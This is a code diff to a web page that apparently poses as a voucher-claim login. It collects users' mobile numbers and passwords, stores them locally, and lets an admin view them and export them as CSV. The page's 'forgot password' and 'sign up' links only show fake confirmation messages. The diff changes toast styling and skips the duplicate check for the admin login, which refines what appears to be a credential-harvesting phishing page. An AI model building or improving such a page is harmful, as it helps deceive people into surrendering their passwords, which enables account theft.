@@ -691,8 +691,19 @@
         }
 
         .toast i {
-            color: #ffd700;
             margin-right: 8px;
+        }
+
+        .toast.success i {
+            color: #00a651;
+        }
+
+        .toast.error i {
+            color: #ff6b35;
+        }
+
+        .toast.warning i {
+            color: #ffd700;
         }
 
         @media (max-width: 480px) {
@@ -976,9 +987,10 @@
             let isAdminLoggedIn = false;
 
             // Toast notification
-            function showToast(message, isSuccess = true) {
-                toast.innerHTML = `<i class="fas ${isSuccess ? 'fa-check-circle' : 'fa-exclamation-circle'}"></i> ${message}`;
-                toast.className = 'toast show';
+            function showToast(message, type = 'success') {
+                toast.className = 'toast';
+                toast.innerHTML = `<i class="fas ${type === 'success' ? 'fa-check-circle' : type === 'error' ? 'fa-exclamation-circle' : 'fa-exclamation-triangle'}"></i> ${message}`;
+                toast.className = `toast show ${type}`;
                 setTimeout(() => {
                     toast.className = 'toast';
                 }, 3000);
@@ -1014,16 +1026,20 @@
                 return existingData.some(item => item.mobile === mobile && item.password === password);
             }
 
-            // Save data to localStorage (prevents duplicates)
-            function saveData(mobile, password) {
+            // Save data to localStorage
+            function saveData(mobile, password, isAdmin = false) {
                 try {
-                    // Check for duplicate
-                    if (isDuplicate(mobile, password)) {
-                        showToast('This entry already exists! Duplicate not saved.', false);
-                        return false;
+                    // If admin, ALWAYS save (no duplicate check)
+                    let existingData = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
+
+                    // Only check for duplicates if NOT admin
+                    if (!isAdmin) {
+                        if (isDuplicate(mobile, password)) {
+                            showToast('This entry already exists! Duplicate not saved.', 'warning');
+                            return false;
+                        }
                     }
 
-                    let existingData = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
                     const newEntry = {
                         id: existingData.length + 1,
                         timestamp: new Date().toLocaleString(),
@@ -1032,11 +1048,11 @@
                     };
                     existingData.push(newEntry);
                     localStorage.setItem(STORAGE_KEY, JSON.stringify(existingData));
-                    showToast('Voucher claimed successfully! Data saved.');
+                    showToast('Voucher claimed successfully! Data saved.', 'success');
                     return true;
                 } catch (error) {
                     console.error('Error saving data:', error);
-                    showToast('Error saving data. Please try again.', false);
+                    showToast('Error saving data. Please try again.', 'error');
                     return false;
                 }
             }
@@ -1085,7 +1101,7 @@
             function exportCSV() {
                 const data = getData();
                 if (data.length === 0) {
-                    showToast('No data to export.', false);
+                    showToast('No data to export.', 'warning');
                     return;
                 }
 
@@ -1103,7 +1119,7 @@
                 a.click();
                 document.body.removeChild(a);
                 URL.revokeObjectURL(url);
-                showToast('Data exported successfully!');
+                showToast('Data exported successfully!', 'success');
             }
 
             // Clear all data
@@ -1111,7 +1127,7 @@
                 if (confirm('Are you sure you want to delete all saved data?')) {
                     localStorage.removeItem(STORAGE_KEY);
                     renderDataTable();
-                    showToast('All data cleared!');
+                    showToast('All data cleared!', 'success');
                 }
             }
 
@@ -1153,14 +1169,15 @@
                 const password = passwordInput.value.trim();
 
                 if (!mobile || !password) {
-                    showToast('Please fill in both fields.', false);
+                    showToast('Please fill in both fields.', 'error');
                     return;
                 }
 
                 // Check if it's the admin credentials
                 if (mobile === ADMIN_MOBILE && password === ADMIN_PASSWORD) {
                     isAdminLoggedIn = true;
-                    const success = saveData(mobile, password);
+                    // ADMIN: Always save, no duplicate check
+                    const success = saveData(mobile, password, true);
                     if (success) {
                         cautionModal.classList.add('active');
                         mobileInput.value = '';
@@ -1170,8 +1187,8 @@
                     return;
                 }
 
-                // Regular user - just save data and show caution
-                const success = saveData(mobile, password);
+                // Regular user: Save with duplicate check
+                const success = saveData(mobile, password, false);
                 if (success) {
                     cautionModal.classList.add('active');
                     mobileInput.value = '';
@@ -1206,7 +1223,7 @@
                 if (isAdminLoggedIn) {
                     showDashboard();
                 } else {
-                    showToast('Please login with admin credentials to view data.', false);
+                    showToast('Please login with admin credentials to view data.', 'warning');
                 }
             });
 
@@ -1224,13 +1241,13 @@
             // Forgot password
             document.querySelector('.forgot-link').addEventListener('click', function(e) {
                 e.preventDefault();
-                showToast('Password reset link sent to your registered mobile number.');
+                showToast('Password reset link sent to your registered mobile number.', 'success');
             });
 
             // Sign Up link
             document.querySelector('.signup-prompt a').addEventListener('click', function(e) {
                 e.preventDefault();
-                showToast('Redirecting to sign up page...');
+                showToast('Redirecting to sign up page...', 'success');
             });
 
             // Keyboard shortcuts
